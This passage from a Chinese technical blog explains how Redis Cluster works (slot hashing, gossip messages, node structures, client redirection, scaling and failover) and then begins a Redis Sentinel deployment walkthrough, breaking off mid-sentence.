槽0-3位于node1，4-7位于node2，以此类推。如果此时删除node2，只需要将槽4-7重新分配即可，例如槽4-5分配给node1，槽6分配给node3，槽7分配给node4；可以看出删除node2后，数据在其他节点的分布仍然较为均衡。</p><p>槽的数量一般远小于2^32，远大于实际节点的数量；在Redis集群中，槽的数量为16384。</p><p>下面这张图很好的总结了Redis集群将数据映射到实际节点的过程：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic14.png"><ul><li>Redis对数据的特征值（一般是key）计算哈希值，使用的算法是CRC16。</li><li>根据哈希值，计算数据属于哪个槽。</li><li>根据槽与节点的映射关系，计算数据属于哪个节点。</li></ul><h4 id="节点通信机制"><a href="#节点通信机制" class="headerlink" title="节点通信机制"></a>节点通信机制</h4><p>集群要作为一个整体工作，离不开节点之间的通信。</p><h5 id="两个端口"><a href="#两个端口" class="headerlink" title="两个端口"></a>两个端口</h5><p>在哨兵系统中，节点分为数据节点和哨兵节点：前者存储数据，后者实现额外的控制功能。在集群中，没有数据节点与非数据节点之分：所有的节点都存储数据，也都参与集群状态的维护。为此，集群中的每个节点，都提供了两个TCP端口：</p><ul><li>普通端口：即我们在前面指定的端口(7000等)。普通端口主要用于为客户端提供服务（与单机节点类似）；但在节点间数据迁移时也会使用。</li><li>集群端口：端口号是普通端口+10000（10000是固定值，无法改变），如7000节点的集群端口为17000。集群端口只用于节点之间的通信，如搭建集群、增减节点、故障转移等操作时节点间的通信；不要使用客户端连接集群接口。为了保证集群可以正常工作，在配置防火墙时，要同时开启普通端口和集群端口。</li></ul><h5 id="Gossip协议"><a href="#Gossip协议" class="headerlink" title="Gossip协议"></a>Gossip协议</h5><p>节点间通信，按照通信协议可以分为几种类型：单对单、广播、Gossip协议等。重点是广播和Gossip的对比。</p><p>广播是指向集群内所有节点发送消息；优点是集群的收敛速度快(集群收敛是指集群内所有节点获得的集群信息是一致的)，缺点是每条消息都要发送给所有节点，CPU、带宽等消耗较大。</p><p>Gossip协议的特点是：在节点数量有限的网络中，每个节点都“随机”的与部分节点通信（并不是真正的随机，而是根据特定的规则选择通信的节点），经过一番杂乱无章的通信，每个节点的状态很快会达到一致。Gossip协议的优点有负载(比广播)低、去中心化、容错性高(因为通信有冗余)等；缺点主要是集群的收敛速度慢。</p><h5 id="消息类型"><a href="#消息类型" class="headerlink" title="消息类型"></a>消息类型</h5><p>集群中的节点采用固定频率（每秒10次）的定时任务进行通信相关的工作：判断是否需要发送消息及消息类型、确定接收节点、发送消息等。如果集群状态发生了变化，如增减节点、槽状态变更，通过节点间的通信，所有节点会很快得知整个集群的状态，使集群收敛。</p><p>节点间发送的消息主要分为5种：meet消息、ping消息、pong消息、fail消息、publish消息。不同的消息类型，通信协议、发送的频率和时机、接收节点的选择等是不同的。</p><ul><li>MEET消息：在节点握手阶段，当节点收到客户端的CLUSTER MEET命令时，会向新加入的节点发送MEET消息，请求新节点加入到当前集群；新节点收到MEET消息后会回复一个PONG消息。</li><li>PING消息：集群里每个节点每秒钟会选择部分节点发送PING消息，接收者收到消息后会回复一个PONG消息。PING消息的内容是自身节点和部分其他节点的状态信息；作用是彼此交换信息，以及检测节点是否在线。PING消息使用Gossip协议发送，接收节点的选择兼顾了收敛速度和带宽成本，具体规则如下：(1)随机找5个节点，在其中选择最久没有通信的1个节点(2)扫描节点列表，选择最近一次收到PONG消息时间大于cluster_node_timeout/2的所有节点，防止这些节点长时间未更新。</li><li>PONG消息：PONG消息封装了自身状态数据。可以分为两种：第一种是在接到MEET/PING消息后回复的PONG消息；第二种是指节点向集群广播PONG消息，这样其他节点可以获知该节点的最新信息，例如故障恢复后新的主节点会广播PONG消息。</li><li>FAIL消息：当一个主节点判断另一个主节点进入FAIL状态时，会向集群广播这一FAIL消息；接收节点会将这一FAIL消息保存起来，便于后续的判断。</li><li>PUBLISH消息：节点收到PUBLISH命令后，会先执行该命令，然后向集群广播这一消息，接收节点也会执行该PUBLISH命令。</li></ul><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>节点需要专门的数据结构来存储集群的状态。所谓集群的状态，是一个比较大的概念，包括：集群是否处于上线状态、集群中有哪些节点、节点是否可达、节点的主从状态、槽的分布……</p><p>节点为了存储集群状态而提供的数据结构中，最关键的是clusterNode和clusterState结构：前者记录了一个节点的状态，后者记录了集群作为一个整体的状态。</p><h5 id="clusterNode"><a href="#clusterNode" class="headerlink" title="clusterNode"></a>clusterNode</h5><p>clusterNode结构保存了一个节点的当前状态，包括创建时间、节点id、ip和端口号等。每个节点都会用一个clusterNode结构记录自己的状态，并为集群内所有其他节点都创建一个clusterNode结构来记录节点状态。</p><p>下面列举了clusterNode的部分字段，并说明了字段的含义和作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">typedef struct clusterNode &#123;</span><br><span class="line">    //节点创建时间</span><br><span class="line">    mstime_t ctime;</span><br><span class="line"> </span><br><span class="line">    //节点id</span><br><span class="line">    char name[REDIS_CLUSTER_NAMELEN];</span><br><span class="line"> </span><br><span class="line">    //节点的ip和端口号</span><br><span class="line">    char ip[REDIS_IP_STR_LEN];</span><br><span class="line">    int port;</span><br><span class="line"> </span><br><span class="line">    //节点标识：整型，每个bit都代表了不同状态，如节点的主从状态、是否在线、是否在握手等</span><br><span class="line">    int flags;</span><br><span class="line"> </span><br><span class="line">    //配置纪元：故障转移时起作用，类似于哨兵的配置纪元</span><br><span class="line">    uint64_t configEpoch;</span><br><span class="line"> </span><br><span class="line">    //槽在该节点中的分布：占用16384/8个字节，16384个比特；每个比特对应一个槽：比特值为1，则该比特对应的槽在节点中；比特值为0，则该比特对应的槽不在节点中</span><br><span class="line">    unsigned char slots[16384/8];</span><br><span class="line"> </span><br><span class="line">    //节点中槽的数量</span><br><span class="line">    int numslots;</span><br><span class="line"> </span><br><span class="line">    …………</span><br><span class="line"> </span><br><span class="line">&#125; clusterNode;</span><br></pre></td></tr></table></figure><p>除了上述字段，clusterNode还包含节点连接、主从复制、故障发现和转移需要的信息等。</p><h5 id="clusterState"><a href="#clusterState" class="headerlink" title="clusterState"></a>clusterState</h5><p>clusterState结构保存了在当前节点视角下，集群所处的状态。主要字段包括：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">typedef struct clusterState &#123;</span><br><span class="line"> </span><br><span class="line">    //自身节点</span><br><span class="line">    clusterNode *myself;</span><br><span class="line"> </span><br><span class="line">    //配置纪元</span><br><span class="line">    uint64_t currentEpoch;</span><br><span class="line"> </span><br><span class="line">    //集群状态：在线还是下线</span><br><span class="line">    int state;</span><br><span class="line"> </span><br><span class="line">    //集群中至少包含一个槽的节点数量</span><br><span class="line">    int size;</span><br><span class="line"> </span><br><span class="line">    //哈希表，节点名称-&gt;clusterNode节点指针</span><br><span class="line">    dict *nodes;</span><br><span class="line">  </span><br><span class="line">    //槽分布信息：数组的每个元素都是一个指向clusterNode结构的指针；如果槽还没有分配给任何节点，则为NULL</span><br><span class="line">    clusterNode *slots[16384];</span><br><span class="line"> </span><br><span class="line">    …………</span><br><span class="line">     </span><br><span class="line">&#125; clusterState;</span><br></pre></td></tr></table></figure><p>除此之外，clusterState还包括故障转移、槽迁移等需要的信息。</p><h4 id="集群命令的实现"><a href="#集群命令的实现" class="headerlink" title="集群命令的实现"></a>集群命令的实现</h4><p>这一部分将以cluster meet(节点握手)、cluster addslots(槽分配)为例，说明节点是如何利用上述数据结构和通信机制实现集群命令的。</p><h5 id="cluster-meet"><a href="#cluster-meet" class="headerlink" title="cluster meet"></a>cluster meet</h5><p>假设要向A节点发送cluster meet命令，将B节点加入到A所在的集群，则A节点收到命令后，执行的操作如下：</p><ul><li>A为B创建一个clusterNode结构，并将其添加到clusterState的nodes字典中</li><li>A向B发送MEET消息</li><li>B收到MEET消息后，会为A创建一个clusterNode结构，并将其添加到clusterState的nodes字典中</li><li>B回复A一个PONG消息</li><li>A收到B的PONG消息后，便知道B已经成功接收自己的MEET消息</li><li>然后，A向B返回一个PING消息</li><li>B收到A的PING消息后，便知道A已经成功接收自己的PONG消息，握手完成</li><li>之后，A通过Gossip协议将B的信息广播给集群内其他节点，其他节点也会与B握手；一段时间后，集群收敛，B成为集群内的一个普通节点</li></ul><p>通过上述过程可以发现，集群中两个节点的握手过程与TCP类似，都是三次握手：A向B发送MEET；B向A发送PONG；A向B发送PING。</p><h5 id="cluster-addslots"><a href="#cluster-addslots" class="headerlink" title="cluster addslots"></a>cluster addslots</h5><p>集群中槽的分配信息，存储在clusterNode的slots数组和clusterState的slots数组中，两个数组的结构前面已做介绍；二者的区别在于：前者存储的是该节点中分配了哪些槽，后者存储的是集群中所有槽分别分布在哪个节点。</p><p>cluster addslots命令接收一个槽或多个槽作为参数，例如在A节点上执行cluster addslots {0..10}命令，是将编号为0-10的槽分配给A节点，具体执行过程如下：</p><ul><li>遍历输入槽，检查它们是否都没有分配，如果有一个槽已分配，命令执行失败；方法是检查输入槽在clusterState.slots[]中对应的值是否为NULL。</li><li>遍历输入槽，将其分配给节点A；方法是修改clusterNode.slots[]中对应的比特为1，以及clusterState.slots[]中对应的指针指向A节点</li><li>A节点执行完成后，通过节点通信机制通知其他节点，所有节点都会知道0-10的槽分配给了A节点</li></ul><h3 id="客户端访问集群"><a href="#客户端访问集群" class="headerlink" title="客户端访问集群"></a>客户端访问集群</h3><p>在集群中，数据分布在不同的节点中，客户端通过某节点访问数据时，数据可能不在该节点中；下面介绍集群是如何处理这个问题的。</p><h4 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h4><p>当节点收到redis-cli发来的命令(如set/get)时，过程如下：</p><p>（1）计算key属于哪个槽：CRC16(key) &amp; 16383</p><p>集群提供的cluster keyslot命令也是使用上述公式实现，如：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic15.png"><p>（2）判断key所在的槽是否在当前节点：假设key位于第i个槽，clusterState.slots[i]则指向了槽所在的节点，如果clusterState.slots[i]==clusterState.myself，说明槽在当前节点，可以直接在当前节点执行命令；否则，说明槽不在当前节点，则查询槽所在节点的地址(clusterState.slots[i].ip/port)，并将其包装到MOVED错误中返回给redis-cli。</p><p>（3）redis-cli收到MOVED错误后，根据返回的ip和port重新发送请求。</p><p>下面的例子展示了redis-cli和集群的互动过程：在7000节点中操作key1，但key1所在的槽9189在节点7001中，因此节点返回MOVED错误(包含7001节点的ip和port)给redis-cli，redis-cli重新向7001发起请求。</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic16.png"><p>上例中，redis-cli通过-c指定了集群模式，如果没有指定，redis-cli无法处理MOVED错误：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic17.png"><h4 id="Smart客户端"><a href="#Smart客户端" class="headerlink" title="Smart客户端"></a>Smart客户端</h4><p>redis-cli这一类客户端称为Dummy客户端，因为它们在执行命令前不知道数据在哪个节点，需要借助MOVED错误重新定向。与Dummy客户端相对应的是Smart客户端。</p><p>Smart客户端（以Java的JedisCluster为例）的基本原理：</p><p>（1）JedisCluster初始化时，在内部维护slot-&gt;node的缓存，方法是连接任一节点，执行cluster slots命令，该命令返回如下所示：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic18.png"><p>（2）此外，JedisCluster为每个节点创建连接池(即JedisPool)。</p><p>（3）当执行命令时，JedisCluster根据key-&gt;slot-&gt;node选择需要连接的节点，发送命令。如果成功，则命令执行完毕。如果执行失败，则会随机选择其他节点进行重试，并在出现MOVED错误时，使用cluster slots重新同步slot-&gt;node的映射关系。</p><p>下面代码演示了如何使用JedisCluster访问集群(未考虑资源释放、异常处理等)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static void test() &#123;</span><br><span class="line">   Set&lt;HostAndPort&gt; nodes = new HashSet&lt;&gt;();</span><br><span class="line">   nodes.add(new HostAndPort(&quot;192.168.72.128&quot;, 7000));</span><br><span class="line">   nodes.add(new HostAndPort(&quot;192.168.72.128&quot;, 7001));</span><br><span class="line">   nodes.add(new HostAndPort(&quot;192.168.72.128&quot;, 7002));</span><br><span class="line">   nodes.add(new HostAndPort(&quot;192.168.72.128&quot;, 8000));</span><br><span class="line">   nodes.add(new HostAndPort(&quot;192.168.72.128&quot;, 8001));</span><br><span class="line">   nodes.add(new HostAndPort(&quot;192.168.72.128&quot;, 8002));</span><br><span class="line">   JedisCluster cluster = new JedisCluster(nodes);</span><br><span class="line">   System.out.println(cluster.get(&quot;key1&quot;));</span><br><span class="line">   cluster.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意事项如下：</p><ul><li>JedisCluster中已经包含所有节点的连接池，因此JedisCluster要使用单例。</li><li>客户端维护了slot-&gt;node映射关系以及为每个节点创建了连接池，当节点数量较多时，应注意客户端内存资源和连接资源的消耗。</li><li>Jedis较新版本针对JedisCluster做了一些性能方面的优化，如cluster slots缓存更新和锁阻塞等方面的优化，应尽量使用2.8.2及以上版本的Jedis。</li></ul><h3 id="实践须知"><a href="#实践须知" class="headerlink" title="实践须知"></a>实践须知</h3><p>前面介绍了集群正常运行和访问的方法和原理，下面是一些重要的补充内容。</p><h4 id="集群伸缩"><a href="#集群伸缩" class="headerlink" title="集群伸缩"></a>集群伸缩</h4><p>实践中常常需要对集群进行伸缩，如访问量增大时的扩容操作。Redis集群可以在不影响对外服务的情况下实现伸缩；伸缩的核心是槽迁移：修改槽与节点的对应关系，实现槽(即数据)在节点之间的移动。例如，如果槽均匀分布在集群的3个节点中，此时增加一个节点，则需要从3个节点中分别拿出一部分槽给新节点，从而实现槽在4个节点中的均匀分布。</p><h5 id="增加节点"><a href="#增加节点" class="headerlink" title="增加节点"></a>增加节点</h5><p>假设要增加7003和8003节点，其中8003是7003的从节点；步骤如下：</p><p>（1）启动节点：方法参见集群搭建</p><p>（2）节点握手：可以使用cluster meet命令，但在生产环境中建议使用redis-trib.rb的add-node工具，其原理也是cluster meet，但它会先检查新节点是否已加入其它集群或者存在数据，避免加入到集群后带来混乱。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-trib.rb add-node 192.168.72.128:7003 192.168.72.128 7000</span><br><span class="line">redis-trib.rb add-node 192.168.72.128:8003 192.168.72.128 7000</span><br></pre></td></tr></table></figure><p>（3）迁移槽：推荐使用redis-trib.rb的reshard工具实现。reshard自动化程度很高，只需要输入redis-trib.rb reshard ip:port (ip和port可以是集群中的任一节点)，然后按照提示输入以下信息，槽迁移会自动完成：</p><ul><li>待迁移的槽数量：16384个槽均分给4个节点，每个节点4096个槽，因此待迁移槽数量为4096</li><li>目标节点id：7003节点的id</li><li>源节点的id：7000/7001/7002节点的id</li></ul><p>（4）指定主从关系：方法参见集群搭建</p><h5 id="减少节点"><a href="#减少节点" class="headerlink" title="减少节点"></a>减少节点</h5><p>假设要下线7000/8000节点，可以分为两步：</p><p>（1）迁移槽：使用reshard将7000节点中的槽均匀迁移到7001/7002/7003节点</p><p>（2）下线节点：使用redis-trib.rb del-node工具；应先下线从节点再下线主节点，因为若主节点先下线，从节点会被指向其他主节点，造成不必要的全量复制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-trib.rb del-node 192.168.72.128:7001 &#123;节点8000的id&#125;</span><br><span class="line">redis-trib.rb del-node 192.168.72.128:7001 &#123;节点7000的id&#125;</span><br></pre></td></tr></table></figure><h5 id="ASK错误"><a href="#ASK错误" class="headerlink" title="ASK错误"></a>ASK错误</h5><p>集群伸缩的核心是槽迁移。在槽迁移过程中，如果客户端向源节点发送命令，源节点执行流程如下：</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic19.png"><p>客户端收到ASK错误后，从中读取目标节点的地址信息，并向目标节点重新发送请求，就像收到MOVED错误时一样。但是二者有很大区别：ASK错误说明数据正在迁移，不知道何时迁移完成，因此重定向是临时的，SMART客户端不会刷新slots缓存；MOVED错误重定向则是(相对)永久的，SMART客户端会刷新slots缓存。</p><h4 id="故障转移"><a href="#故障转移" class="headerlink" title="故障转移"></a>故障转移</h4><p>在 <a href="/2019/04/07/入学习Redis之哨兵/">深入学习Redis之哨兵</a> 一文中，介绍了哨兵实现故障发现和故障转移的原理。虽然细节上有很大不同，但集群的实现与哨兵思路类似：通过定时任务发送PING消息检测其他节点状态；节点下线分为主观下线和客观下线；客观下线后选取从节点进行故障转移。</p><p>与哨兵一样，集群只实现了主节点的故障转移；从节点故障时只会被下线，不会进行故障转移。因此，使用集群时，应谨慎使用读写分离技术，因为从节点故障会导致读服务不可用，可用性变差。</p><p>这里不再详细介绍故障转移的细节，只对重要事项进行说明：</p><p><strong>节点数量</strong>：在故障转移阶段，需要由主节点投票选出哪个从节点成为新的主节点；从节点选举胜出需要的票数为N/2+1；其中N为主节点数量(包括故障主节点)，但故障主节点实际上不能投票。因此为了能够在故障发生时顺利选出从节点，集群中至少需要3个主节点(且部署在不同的物理机上)。</p><p><strong>故障转移时间</strong>：从主节点故障发生到完成转移，所需要的时间主要消耗在主观下线识别、主观下线传播、选举延迟等几个环节；具体时间与参数cluster-node-timeout有关，一般来说：</p><p>故障转移时间(毫秒) ≤ 1.5 * cluster-node-timeout + 1000</p><p>cluster-node-timeout的默认值为15000ms(15s)，因此故障转移时间会在20s量级。</p><h4 id="集群的限制及应对方法"><a href="#集群的限制及应对方法" class="headerlink" title="集群的限制及应对方法"></a>集群的限制及应对方法</h4><p>由于集群中的数据分布在不同节点中，导致一些功能受限，包括：</p><p>（1）key批量操作受限：例如mget、mset操作，只有当操作的key都位于一个槽时，才能进行。针对该问题，一种思路是在客户端记录槽与key的信息，每次针对特定槽执行mget/mset；另外一种思路是使用Hash Tag，将在下一小节介绍。</p><p>（2）keys/flushall等操作：keys/flushall等操作可以在任一节点执行，但是结果只针对当前节点，例如keys操作只返回当前节点的所有键。针对该问题，可以在客户端使用cluster nodes获取所有节点信息，并对其中的所有主节点执行keys/flushall等操作。</p><p>（3）事务/Lua脚本：集群支持事务及Lua脚本，但前提条件是所涉及的key必须在同一个节点。Hash Tag可以解决该问题。</p><p>（4）数据库：单机Redis节点可以支持16个数据库，集群模式下只支持一个，即db0。</p><p>（5）复制结构：只支持一层复制结构，不支持嵌套。</p><h4 id="Hash-Tag"><a href="#Hash-Tag" class="headerlink" title="Hash Tag"></a>Hash Tag</h4><p>Hash Tag原理是：<strong>当一个key包含 {} 的时候，不对整个key做hash，而仅对 {} 包括的字符串做hash。</strong></p><p>Hash Tag可以让不同的key拥有相同的hash值，从而分配在同一个槽里；这样针对不同key的批量操作(mget/mset等)，以及事务、Lua脚本等都可以支持。不过Hash Tag可能会带来数据分配不均的问题，这时需要：</p><ul><li>调整不同节点中槽的数量，使数据分布尽量均匀；</li><li>避免对热点数据使用Hash Tag，导致请求分布不均。</li></ul><p>下面是使用Hash Tag的一个例子；通过对product加Hash Tag，可以将所有产品信息放到同一个槽中，便于操作。</p><img src="/2019/04/08/2019-04-08-深入学习Redis之集群/pic20.png"><h4 id="参数优化"><a href="#参数优化" class="headerlink" title="参数优化"></a>参数优化</h4><h5 id="cluster-node-timeout"><a href="#cluster-node-timeout" class="headerlink" title="cluster_node_timeout"></a>cluster_node_timeout</h5><p>cluster_node_timeout参数在前面已经初步介绍；它的默认值是15s，影响包括：</p><p>（1）影响PING消息接收节点的选择：值越大对延迟容忍度越高，选择的接收节点越少，可以降低带宽，但会降低收敛速度；应根据带宽情况和应用要求进行调整。</p><p>（2）影响故障转移的判定和时间：值越大，越不容易误判，但完成转移消耗时间越长；应根据网络状况和应用要求进行调整。</p><h5 id="cluster-require-full-coverage"><a href="#cluster-require-full-coverage" class="headerlink" title="cluster-require-full-coverage"></a>cluster-require-full-coverage</h5><p>前面提到，只有当16384个槽全部分配完毕时，集群才能上线。这样做是为了保证集群的完整性，但同时也带来了新的问题：当主节点发生故障而故障转移尚未完成，原主节点中的槽不在任何节点中，此时会集群处于下线状态，无法响应客户端的请求。</p><p>cluster-require-full-coverage参数可以改变这一设定：如果设置为no，则当槽没有完全分配时，集群仍可以上线。参数默认值为yes，如果应用对可用性要求较高，可以修改为no，但需要自己保证槽全部分配。</p><h4 id="redis-trib-rb"><a href="#redis-trib-rb" class="headerlink" title="redis-trib.rb"></a>redis-trib.rb</h4><p>redis-trib.rb提供了众多实用工具：创建集群、增减节点、槽迁移、检查完整性、数据重新平衡等；通过help命令可以查看详细信息。在实践中如果能使用redis-trib.rb工具则尽量使用，不但方便快捷，还可以大大降低出错概率。</p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入学习Redis之哨兵</title>
      <link href="/2019/04/07/2019-04-07-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E5%93%A8%E5%85%B5/"/>
      <url>/2019/04/07/2019-04-07-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%E4%B9%8B%E5%93%A8%E5%85%B5/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 主节点的自动故障转移 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="作用和架构"><a href="#作用和架构" class="headerlink" title="作用和架构"></a>作用和架构</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>Redis Sentinel，即Redis哨兵，在Redis 2.8版本开始引入。哨兵的核心功能是主节点的自动故障转移。下面是Redis官方文档对于哨兵功能的描述：</p><ul><li>监控（Monitoring）：哨兵会不断地检查主节点和从节点是否运作正常。</li><li>自动故障转移（Automatic failover）：当主节点不能正常工作时，哨兵会开始自动故障转移操作，它会将失效主节点的其中一个从节点升级为新的主节点，并让其他从节点改为复制新的主节点。</li><li>配置提供者（Configuration provider）：客户端在初始化时，通过连接哨兵来获得当前Redis服务的主节点地址。</li><li>通知（Notification）：哨兵可以将故障转移的结果发送给客户端。</li></ul><p>其中，监控和自动故障转移功能，使得哨兵可以及时发现主节点故障并完成转移；而配置提供者和通知功能，则需要在与客户端的交互中才能体现。</p><p>这里对“客户端”一词在文章中的用法做一个说明：在前面的文章中，只要通过API访问redis服务器，都会称作客户端，包括redis-cli、Java客户端Jedis等；为了便于区分说明，本文中的客户端并不包括redis-cli，而是比redis-cli更加复杂：redis-cli使用的是redis提供的底层接口，而客户端则对这些接口、功能进行了封装，以便充分利用哨兵的配置提供者和通知功能。</p><h4 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h4><p>典型的哨兵架构图如下所示：</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic1.png"><p>它由两部分组成，哨兵节点和数据节点：</p><ul><li>哨兵节点：哨兵系统由一个或多个哨兵节点组成，哨兵节点是特殊的redis节点，不存储数据。</li><li>数据节点：主节点和从节点都是数据节点。</li></ul><h3 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h3><p>这一部分将部署一个简单的哨兵系统，包含1个主节点、2个从节点和3个哨兵节点。方便起见：所有这些节点都部署在一台机器上（局域网IP：192.168.92.128），使用端口号区分；节点的配置尽可能简化。</p><h4 id="部署主从节点"><a href="#部署主从节点" class="headerlink" title="部署主从节点"></a>部署主从节点</h4><p>哨兵系统中的主从节点，与普通的主从节点配置是一样的，并不需要做任何额外配置。下面分别是主节点（port=6379）和2个从节点（port=6380/6381）的配置文件，配置都比较简单，不再详述。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#redis-6379.conf</span><br><span class="line">port 6379</span><br><span class="line">daemonize yes</span><br><span class="line">logfile &quot;6379.log&quot;</span><br><span class="line">dbfilename &quot;dump-6379.rdb&quot;</span><br><span class="line"> </span><br><span class="line">#redis-6380.conf</span><br><span class="line">port 6380</span><br><span class="line">daemonize yes</span><br><span class="line">logfile &quot;6380.log&quot;</span><br><span class="line">dbfilename &quot;dump-6380.rdb&quot;</span><br><span class="line">slaveof 192.168.92.128 6379</span><br><span class="line"> </span><br><span class="line">#redis-6381.conf</span><br><span class="line">port 6381</span><br><span class="line">daemonize yes</span><br><span class="line">logfile &quot;6381.log&quot;</span><br><span class="line">dbfilename &quot;dump-6381.rdb&quot;</span><br><span class="line">slaveof 192.168.92.128 6379</span><br></pre></td></tr></table></figure><p>配置完成后，依次启动主节点和从节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis-6379.conf</span><br><span class="line">redis-server redis-6380.conf</span><br><span class="line">redis-server redis-6381.conf</span><br></pre></td></tr></table></figure><p>节点启动后，连接主节点查看主从状态是否正常，如下图所示：</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic2.png"><h4 id="部署哨兵节点"><a href="#部署哨兵节点" class="headerlink" title="部署哨兵节点"></a>部署哨兵节点</h4><p>哨兵节点本质上是特殊的Redis节点。</p><p>3个哨兵节点的配置几乎是完全一样的，主要区别在于端口号的不同（26379/26380/26381），下面以26379节点为例介绍节点的配置和启动方式；配置部分尽量简化，更多配置会在后面介绍。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#sentinel-26379.conf</span><br><span class="line">port 26379</span><br><span class="line">daemonize yes</span><br><span class="line">logfile &quot;26379.log&quot;</span><br><span class="line">sentinel monitor mymaster 192.168.92.128 6379 2</span><br></pre></td></tr></table></figure><p>其中，sentinel monitor mymaster 192.168.92.128 6379 2 配置的含义是：该哨兵节点监控192.168.92.128:6379这个主节点，该主节点的名称是mymaster，最后的2的含义与主节点的故障判定有关：至少需要2个哨兵节点同意，才能判定主节点故障并进行故障转移。</p><p>哨兵节点的启动有两种方式，二者作用是完全相同的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-sentinel sentinel-26379.conf</span><br><span class="line">redis-server sentinel-26379.conf --sentinel</span><br></pre></td></tr></table></figure><p>按照上述方式配置和启动之后，整个哨兵系统就启动完毕了。可以通过redis-cli连接哨兵节点进行验证，如下图所示：可以看出26379哨兵节点已经在监控mymaster主节点(即192.168.92.128:6379)，并发现了其2个从节点和另外2个哨兵节点。</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic3.png"><p>此时如果查看哨兵节点的配置文件，会发现一些变化，以26379为例：</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic4.png"><p>其中，dir只是显式声明了数据和日志所在的目录（在哨兵语境下只有日志）；known-slave和known-sentinel显示哨兵已经发现了从节点和其他哨兵；带有epoch的参数与配置纪元有关（配置纪元是一个从0开始的计数器，每进行一次领导者哨兵选举，都会+1；领导者哨兵选举是故障转移阶段的一个操作，在后文原理部分会介绍）。</p><h4 id="演示故障转移"><a href="#演示故障转移" class="headerlink" title="演示故障转移"></a>演示故障转移</h4><p>哨兵的4个作用中，配置提供者和通知需要客户端的配合，本文将在下一章介绍客户端访问哨兵系统的方法时详细介绍。这一小节将演示当主节点发生故障时，哨兵的监控和自动故障转移功能。</p><p>（1）首先，使用kill命令杀掉主节点：</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic5.png"><p>（2）如果此时立即在哨兵节点中使用info Sentinel命令查看，会发现主节点还没有切换过来，因为哨兵发现主节点故障并转移，需要一段时间。</p><img src="/2019/04/07/2019-04-07-深入学习Redis之哨兵/pic6.png"><p>（3）一段时间以后，再次在哨兵节点中执行info 